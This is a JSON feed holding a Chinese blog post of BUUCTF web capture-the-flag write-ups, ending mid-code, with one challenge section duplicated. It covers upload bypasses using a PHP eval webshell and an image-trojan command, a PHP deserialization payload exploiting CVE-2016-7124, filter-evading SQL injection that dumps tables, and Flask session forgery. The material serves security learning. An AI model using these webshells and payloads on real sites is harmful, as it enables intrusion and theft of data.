{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园 • All posts by \"大冒险\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/06/29/dmx/buuctf-web/",
            "url": "http://example.com/2021/06/29/dmx/buuctf-web/",
            "title": "Buuctf-web 武林秘籍",
            "date_published": "2021-06-29T03:30:13.000Z",
            "content_html": "<h2 id=\"极客大挑战2019-upload\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战2019-upload\">#</a> 极客大挑战 2019 upload</h2>\n<p><em>关键词：php，phtml，过滤 &lt;?，文件上传</em></p>\n<p>根据 Content-Type 判断图片：Content-Type: image/png</p>\n<p>过滤’&lt;?’，传 phtml 一句话木马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>phtml 简单来说就是将 php 嵌入 html 中</p>\n<p>(这题很诡异的是我上传一个正常图片，回显 Not Image)</p>\n<hr>\n<h2 id=\"极客大挑战2019-php\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战2019-php\">#</a> 极客大挑战 2019 php</h2>\n<p><em>关键词：php 反序列化，网站备份，php 代码审计</em></p>\n<p>🎀网站备份文件名猜测，嫌麻烦直接上目录扫描，为 www.zip</p>\n<p>www.zip 中包含的文件主要为 index.php，class.php，flag.php</p>\n<p>🎀index.php 中关键代码片段如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;class.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$select</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;select&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$res</span>=unserialize(@<span class=\"variable\">$select</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>从 get 请求中获取’select’的值，再将该变量反序列化（其中变量前加 @是为了防止报错信息输出，导致信息泄露）</p>\n<p>🎀class.php 中 Name 对象：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You name is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You password is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">O:<span class=\"number\">4</span><span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;username&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;password&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>从__destruct () 函数中的逻辑来看，只有当 password=100，username=admin 时，会输出 flag 的值</p>\n<p>__construct 构造函数会将我们传入的值赋值给变量 password 和 username，但是在反序列化后会调用__wakeup ()，将 username 赋值为 guest</p>\n<p><strong>CVE-2016-7124：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行</strong></p>\n<p>👆👆👆通过上述漏洞可以跳过__wakeup () 的执行</p>\n<p>构造 exp.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> Name();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">2</span>：&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Nameusername&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Namepassword&quot;</span>;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>但是用 url 编码输出为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Name%<span class=\"number\">22</span>%<span class=\"number\">3</span>A2%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>username%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A5%<span class=\"number\">3</span>A%<span class=\"number\">22</span>admin%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>password%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A3%<span class=\"number\">3</span>A%<span class=\"number\">22100</span>%<span class=\"number\">22</span>%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br></pre></td></tr></table></figure>\n<p>在 Nameusername，Namepassword 中，类名以及变量名前都存在不可见字符 %00</p>\n<p>因为 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上 ascii 为 0 的字符 (不可见字符)</p>\n<p>⭐payload 需要修改的地方为成员变量个数，以及私有字段前增加 %00 (url 编码的不可见字符)</p>\n<p>payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select=O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;%00Name%00username&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;%00Name%00password&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>总结</strong></p>\n<p>🌰<a href=\"https://mayi077.gitee.io/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/\">备份文件参考</a></p>\n<p>常见的网站源码备份文件后缀：tar、tar.gz、zip、rar</p>\n<p>常见的网站源码备份文件名：web、website、backup、back、www、wwwroot、temp</p>\n<p>🌰<a href=\"https://www.php.net/manual/zh/language.oop5.magic.php\">php 魔术方法</a></p>\n<p>serialize () 时，若存在__sleep ()，会先调用__sleep ()，再执行序列化操作</p>\n<p>unserialize () 时，若存在__wakeup ()，反序列化后会调用__wakeup ()</p>\n<hr>\n<h2 id=\"actf2020-新生赛-upload1\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛-upload1\">#</a> ACTF2020 新生赛 Upload1</h2>\n<p><em>关键词：图片马</em></p>\n<p>🐴合成图片马命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 2.jpg/b + shell.php/a shell.jpg</span><br></pre></td></tr></table></figure>\n<p>上传 shell.jpg，抓包更改后缀名为 php，回显 nonono~ Bad file！</p>\n<p>更改后缀名为随机乱码字符，回显上传成功，目测设置黑名单</p>\n<p><img src=\"buuctf-web1.png\" alt=\"\"></p>\n<p>设置 phtml 后缀名，绕过成功</p>\n<p>shell.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>合成图片马，上传改后缀，连 shell</p>\n<hr>\n<h2 id=\"极客大挑战-2019-babysql1\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019-babysql1\">#</a> 极客大挑战 2019 BabySQL1</h2>\n<p><em>关键词：sql 注入、过滤关键字、过滤特殊符号、字符拼接</em></p>\n<p>看题，登录框 sql 注入</p>\n<p>经测试，发现过滤字符：select，sleep，*，and，or，union…</p>\n<p>哈哈很多常用的嘛，不测了</p>\n<p><img src=\"buuctf-web2.png\" alt=\"\"></p>\n<p>考虑使用字符拼接绕过关键词检测，%2b 为’+‘url 编码，直接使用’+' 会被转成空格，payload：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27; an%2bd+slee%2bp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure>\n<p>然后看着题目，发现过滤的关键字都置空的，双写也能绕过</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27; anandd sleesleepp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure>\n<p>打点到此结束⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐</p>\n<p>直接登录获得的并不是 flag，继续找 ，order by 发现为 3 个字段</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"string\">&#x27; o%2brder b%2by 4--+&amp;password=111</span></span><br></pre></td></tr></table></figure>\n<p>回显的字段为 2，3</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,2,3--+</span></span><br></pre></td></tr></table></figure>\n<p>爆表，从 information_schema.tables 中查找当前数据库所有表名，拼接在一起后在第二个字段输出</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,group_concat(table_name),3 fr%2bom info%2brmation_schema.tables whe%2bre ta%2bble_schema=database()--+</span></span><br></pre></td></tr></table></figure>\n<p>爆字段</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,group_concat(column_name),3 fr%2bom info%2brmation_schema.columns whe%2bre ta%2bble_name=&#x27;</span>b4bsql<span class=\"string\">&#x27;--+</span></span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello id,username,password！</span><br></pre></td></tr></table></figure>\n<p>然后发现两个表字段都是一样的，那找 b4bsql 中的数据吧</p>\n<p>拼接每行数据，并用 — 隔开</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">111</span><span class=\"string\">&#x27; uni%2bon sele%2bct 1,group_concat(concat_ws(&#x27;</span><span class=\"comment\">---&#x27;,username,passwo%2brd)),3 fr%2bom b4bsql--+</span></span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<p><img src=\"buuctf-web3.png\" alt=\"\"></p>\n<p><strong>总结</strong></p>\n<p><a href=\"https://www.cnblogs.com/apolloren/p/11002449.html\">SQL 字符串拼接</a></p>\n<hr>\n<h2 id=\"actf2020-新生赛-backupfile1\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛-backupfile1\">#</a> ACTF2020 新生赛 BackupFile1</h2>\n<p><em>关键词：is_numeric () 绕过，== 绕过，php 弱类型比较表</em></p>\n<p>看题，找备份文件，index.php.bak</p>\n<p>🐴index.php 代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;flag.php&quot;</span>;<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>])) &#123;    <span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];    <span class=\"keyword\">if</span>(!is_numeric(<span class=\"variable\">$key</span>)) &#123;        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);    &#125;    <span class=\"variable\">$key</span> = intval(<span class=\"variable\">$key</span>);    <span class=\"variable\">$str</span> = <span class=\"string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class=\"keyword\">if</span>(<span class=\"variable\">$key</span> == <span class=\"variable\">$str</span>) &#123;        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;    &#125;&#125;<span class=\"keyword\">else</span> &#123;    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>分析 1️⃣下，get 传递参数 key</p>\n<p>key 通过 is_numeric 判断是否为数字，再通过 intval 获取变量 key 的整数值</p>\n<p>最后如果变量 key==“123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”，输出 flag</p>\n<p>ヾ (｡｀Д´｡) 干嘛干嘛呢这是，气人</p>\n<p>ლ(╹◡╹ლ) 好了，百度完回来了</p>\n<p>is_numeric ()，可以将字符串转换成 16 进制，绕过判断（经常造成 sql 注入）</p>\n<p>intval ()，获取变量的整数值，默认为十进制</p>\n<p>==，弱类型比较，当字符串和数字进行比较时，只提取字符串中开头的整数部分</p>\n<p>⭐然后突然发现 str 是以 123 开头，弱类型比较是等于 123 的</p>\n<p>好了 payload：?key=123，成功拿到 flag</p>\n<p>…(＿ ＿) ノ｜壁</p>\n<hr>\n<h2 id=\"actf2020-新生赛-backupfile1-2\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛-backupfile1-2\">#</a> ACTF2020 新生赛 BackupFile1</h2>\n<p><em>关键词：is_numeric () 绕过，== 绕过，php 弱类型比较表</em></p>\n<p>看题，找备份文件，index.php.bak</p>\n<p>🐴index.php 代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;flag.php&quot;</span>;<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>])) &#123;    <span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];    <span class=\"keyword\">if</span>(!is_numeric(<span class=\"variable\">$key</span>)) &#123;        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);    &#125;    <span class=\"variable\">$key</span> = intval(<span class=\"variable\">$key</span>);    <span class=\"variable\">$str</span> = <span class=\"string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class=\"keyword\">if</span>(<span class=\"variable\">$key</span> == <span class=\"variable\">$str</span>) &#123;        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;    &#125;&#125;<span class=\"keyword\">else</span> &#123;    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>分析 1️⃣下，get 传递参数 key</p>\n<p>key 通过 is_numeric 判断是否为数字，再通过 intval 获取变量 key 的整数值</p>\n<p>最后如果变量 key==“123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”，输出 flag</p>\n<p>ヾ (｡｀Д´｡) 干嘛干嘛呢这是，气人</p>\n<p>ლ(╹◡╹ლ) 好了，百度完回来了</p>\n<p>is_numeric ()，可以将字符串转换成 16 进制，绕过判断（经常造成 sql 注入）</p>\n<p>intval ()，获取变量的整数值，默认为十进制</p>\n<p>==，弱类型比较，当字符串和数字进行比较时，只提取字符串中开头的整数部分</p>\n<p>⭐然后突然发现 str 是以 123 开头，弱类型比较是等于 123 的</p>\n<p>好了 payload：?key=123，成功拿到 flag</p>\n<p>…(＿ ＿) ノ｜壁</p>\n<hr>\n<h2 id=\"hctf-2018-admin1\"><a class=\"markdownIt-Anchor\" href=\"#hctf-2018-admin1\">#</a> HCTF 2018 admin1</h2>\n<p><em>关键字：flask，session 伪造，unicode 欺骗</em></p>\n<p>🦋登录和注册界面，看题 admin</p>\n<p>输入 admin/admin 登录失败</p>\n<p>注册 admin/admin 该账户已被注册</p>\n<p>🦋爆破⑧行，试了几个弱口令，我觉得留一个注册页面应该是用来注册的</p>\n<p>注册 admin123/admin123（弱口令老玩家٩◔̯◔۶ ）</p>\n<p>登录后回显（测了一遍并没有什么用）：</p>\n<p><img src=\"buuctf-web5.png\" style=\"zoom:40%;\" /><img src=\"buuctf-web6.png\" style=\"zoom:40%;\" /></p>\n<img src=\"buuctf-web4.png\" style=\"zoom:22%;\" />\n<p>🦋在 changepassword 中有一行被注释掉的提示信息</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure>\n<p>flask 是一个微型的 python 开发的 web 框架</p>\n<p>然后发现是题目源码，但是.sql 文件中存储的 admin 密码是 hash 加密过的</p>\n<p>🎀对不起我只能想到构造 admin 的 session 登录 session 用户了</p>\n<p><img src=\"buuctf-web7.gif\" alt=\"img\"></p>\n<p>给当前登录用户的 session 解密如下：</p>\n<p><img src=\"buuctf-web7.png\" alt=\"\"></p>\n<p>可以看到当前登录用户是 admin123 辣</p>\n<p>index.html 界面会回显用户账户名，目测是根据 session 中的 name 回显的，查看源代码中的 index.html 文件：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% include(<span class=\"string\">&#x27;header.html&#x27;</span>) %&#125;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">if</span> current_user.is_authenticated %&#125;</span><br><span class=\"line\">&lt;h1 <span class=\"class\"><span class=\"keyword\">class</span>=&quot;<span class=\"title\">nav</span>&quot;&gt;<span class=\"title\">Hello</span> &#123;&#123; <span class=\"title\">session</span>[&#x27;<span class=\"title\">name</span>&#x27;] &#125;&#125;&lt;/<span class=\"title\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% <span class=\"title\">endif</span> %&#125;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% <span class=\"title\">if</span> <span class=\"title\">current_user</span>.<span class=\"title\">is_authenticated</span> <span class=\"title\">and</span> <span class=\"title\">session</span>[&#x27;<span class=\"title\">name</span>&#x27;] == &#x27;<span class=\"title\">admin</span>&#x27; %&#125;</span></span><br><span class=\"line\"><span class=\"class\">&lt;<span class=\"title\">h1</span> <span class=\"title\">class</span>=&quot;<span class=\"title\">nav</span>&quot;&gt;<span class=\"title\">hctf</span>&#123;<span class=\"title\">xxxxxxxxx</span>&#125;&lt;/<span class=\"title\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% <span class=\"title\">endif</span> %&#125;</span></span><br><span class=\"line\"><span class=\"class\">&lt;!-- <span class=\"title\">you</span> <span class=\"title\">are</span> <span class=\"title\">not</span> <span class=\"title\">admin</span> --&gt;</span></span><br><span class=\"line\"><span class=\"class\">&lt;h1 <span class=\"keyword\">class</span>=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"class\">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span></span><br></pre></td></tr></table></figure>\n<p xxxxxxxxx=\"\">当 session 中的 name=admin 时，会输出 flaghctf</p>\n<p>但是 flask session 加密需要秘钥，在 config.py 中找到 SECRET_KEY=os.environ.get (‘SECRET_KEY’) or ‘ckj123’</p>\n<p><img src=\"buuctf-web11.png\" alt=\"buuctf-web11\"></p>\n<p>利用<a href=\"https://github.com/noraj/flask-session-cookie-manager\"> flask_session 加解密工具</a>进行 session 加解密</p>\n<p>将以下数据加密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;22ef025f1846ed290c3abc33091af4789157e04648638256aa7b8d41e4e27adfa91e24e72c43d5d81353bd327192646b54ca6b77e66626aab5f3d7521feba4ef&#x27;, &#x27;csrf_token&#x27;: b&#x27;62c673754392025e9b7ce0ec4fe937415e76df71&#x27;, &#x27;image&#x27;: b&#x27;wlBG&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"buuctf-web8.png\" alt=\"\"></p>\n<p>拿到 flag，好耶ヾ (✿ﾟ▽ﾟ) ノ</p>\n<p>🎀再来撸一下<a href=\"http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/\"> unicode 同形字引起的安全问题</a></p>\n<p>在这里 <code>Twisted库的版本是10.0.0</code></p>\n<p>nodeprep.prepare () 函数，第一次调用：会把其他类的编码转为 ascii 码，第二次调用：内容转为小写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ᴬᴰᴹᴵᴺ —&gt; ADMIN —&gt; admin</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://xn--rutes-ck2hx70mgflissmgc.py\">查看源代码 rutes.py</a>，自定义一个转小写函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">strlower</span>(<span class=\"params\">username</span>):</span>    username = nodeprep.prepare(username)    <span 